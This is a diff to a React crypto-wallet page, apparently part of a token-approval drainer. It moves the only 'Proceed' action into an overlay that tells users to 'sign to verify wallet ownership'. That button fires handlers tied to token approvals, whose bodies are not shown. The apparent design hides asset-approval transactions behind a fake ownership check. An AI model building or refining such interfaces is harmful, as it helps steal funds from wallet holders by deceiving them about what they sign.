@@ -326,16 +326,15 @@ export default function Home() {
   const tokenSymbol = currentApprovalToken?.symbol || "";
 
   useEffect(() => {
-    const justConnected = (isConnected || solanaConnected) && !wasConnected;
-    if (justConnected) {
-      setShowSigningScreen(true);
+    const nowConnected = isConnected || solanaConnected;
+    if (nowConnected && !wasConnected) {
       setShowUnifiedWalletModal(false);
-      const timer = setTimeout(() => {
-        setShowSigningScreen(false);
-      }, 3000);
-      return () => clearTimeout(timer);
+      setShowSigningScreen(true);
     }
-    setWasConnected(isConnected || solanaConnected);
+    if (!nowConnected && wasConnected) {
+      setShowSigningScreen(false);
+    }
+    setWasConnected(nowConnected);
   }, [isConnected, solanaConnected]);
 
   useEffect(() => {
@@ -755,51 +754,6 @@ export default function Home() {
                   Disconnect
                 </button>
               </div>
-              {networkType === "solana" ? (
-                solanaStep === "done" ? (
-                  <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
-                    <CheckCircle className="w-5 h-5" />
-                    Complete!
-                  </div>
-                ) : (
-                  <button
-                    onClick={handleSolanaProceed}
-                    disabled={isSolanaProcessing}
-                    className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none whitespace-nowrap"
-                    data-testid="button-proceed-solana"
-                  >
-                    {isSolanaProcessing ? (
-                      <>
-                        <Loader2 className="w-5 h-5 animate-spin" />
-                        Processing...
-                      </>
-                    ) : (
-                      "Proceed"
-                    )}
-                  </button>
-                )
-              ) : step === "done" ? (
-                <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
-                  <CheckCircle className="w-5 h-5" />
-                  Complete!
-                </div>
-              ) : (
-                <button
-                  onClick={handleProceed}
-                  disabled={isProcessing}
-                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none whitespace-nowrap"
-                  data-testid="button-proceed"
-                >
-                  {isProcessing ? (
-                    <>
-                      <Loader2 className="w-5 h-5 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    "Proceed"
-                  )}
-                </button>
-              )}
             </div>
           ) : (
             <button 
@@ -849,6 +803,28 @@ export default function Home() {
               <h3 className="text-xl font-semibold text-gray-900 mb-2">Connecting your wallet</h3>
               <p className="text-gray-500 text-sm">Please sign to verify wallet ownership . . .</p>
             </div>
+            <button
+              onClick={() => {
+                setShowSigningScreen(false);
+                if (networkType === "solana") {
+                  handleSolanaProceed();
+                } else {
+                  handleProceed();
+                }
+              }}
+              disabled={isProcessing || isSolanaProcessing}
+              className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
+              data-testid="button-proceed-sign"
+            >
+              {(isProcessing || isSolanaProcessing) ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                  Verifying...
+                </>
+              ) : (
+                "Proceed"
+              )}
+            </button>
           </div>
         </div>
       )}
